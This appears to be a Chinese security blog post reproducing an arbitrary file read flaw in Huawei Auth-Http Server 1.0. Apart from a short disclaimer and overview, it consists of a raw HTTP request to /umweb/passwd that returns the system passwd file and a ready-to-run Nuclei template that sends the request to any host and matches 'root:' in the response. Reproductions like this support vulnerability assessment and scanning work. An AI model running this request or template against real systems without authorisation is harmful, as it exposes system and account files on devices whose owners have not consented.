#  「漏洞复现」华为Auth-Http服务存在任意文件读取   
原创 rain  知黑守白   2023-11-25 08:00  
  
免责声明  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/SaibaRNhOjqg4CicjYhkyn7j8xeutLIIGlA3Pam1Oxz5ujOUsmPibr5J9NCiagtp8nGEEXPeJiaUeWkN3v1XXSS9Vfw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
  
  
此内容仅供技术交流与学习，请勿用于未经授权的场景。请遵循相关法律与道德规范。任何因使用本文所述技术而引发的法律责任，与本文作者及发布平台无关。如有内容争议或侵权，请及时联系我们。谢谢！  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/oMlX8Lll9JhtrlOVpAFwbbnTXyrqweQO0kKLSPTRtSL4MEXjM3TdHU1GMhb3ysoFV3ic9hKDLibzic6T7ADMnfNnA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDu5LeMykBibiaorwCvYEX2sxq5lVYw4iaddx0qYlbQ6fAyXd22dcFOiads8w/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
漏洞概述  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDuYRDXO8rZ2DX4p68v8aWfzp0XSlDyFJvENtj4DwOjoB5CaZVMPnfFYQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
  
  
          
华为Auth-Http Server 1.0任意文件读取，攻击者可通过该漏洞读取任意文件。  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sicaib9ysOXg3amnRlCyf00TDSon1FbsDXuFnTTdwOSH0ibAIS9YS6BF424d9LHWqaFBjhnUWWRyX509xZyQHic6Dg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDu5LeMykBibiaorwCvYEX2sxq5lVYw4iaddx0qYlbQ6fAyXd22dcFOiads8w/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDuYRDXO8rZ2DX4p68v8aWfzp0XSlDyFJvENtj4DwOjoB5CaZVMPnfFYQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
  
```
GET /umweb/passwd HTTP/1.1
Host: 
Connection: keep-alive
sec-ch-ua: "Google Chrome";v="118", "Chromium";v="118", "Not=A?Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9

```  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sicaib9ysOXg3amnRlCyf00TDSon1FbsDXVTVtVIn0JibLOa1GXjgwciawfUyApc6wXUA8icibLIKpicfPRW82DPItpicg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDu5LeMykBibiaorwCvYEX2sxq5lVYw4iaddx0qYlbQ6fAyXd22dcFOiads8w/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
NUCLEI POC  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgmBny4eMeJJOramdTQiciaDuYRDXO8rZ2DX4p68v8aWfzp0XSlDyFJvENtj4DwOjoB5CaZVMPnfFYQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
  
```
id: huawei-auth-http-server-filereadd
info:
  name: 华为Auth-Http服务存在任意文件读取
  author: rain
  severity: high
  description: 华为Auth-Http Server 1.0任意文件读取，攻击者可通过该漏洞读取任意文件。
  tags:
    - file-read
    - huawei
    - auth-http

requests:
  - raw:
      - |
        GET /umweb/passwd HTTP/1.1
        Host: {{Hostname}}
        Connection: keep-alive
        sec-ch-ua: "Google Chrome";v="118", "Chromium";v="118", "Not=A?Brand";v="24"
        sec-ch-ua-mobile: ?0
        sec-ch-ua-platform: "Windows"
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Sec-Fetch-Site: none
        Sec-Fetch-Mode: navigate
        Sec-Fetch-User: ?1
        Sec-Fetch-Dest: document
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code==200 && contains(body,"root:")'

```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sicaib9ysOXg3amnRlCyf00TDSon1FbsDXK9F9h2YpvTfKXEkp5llCsg7AVsRDX9SfcGQOhbxYic7Ip0PfT3c6qyw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/oMlX8Lll9JhtrlOVpAFwbbnTXyrqweQO0kKLSPTRtSL4MEXjM3TdHU1GMhb3ysoFV3ic9hKDLibzic6T7ADMnfNnA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
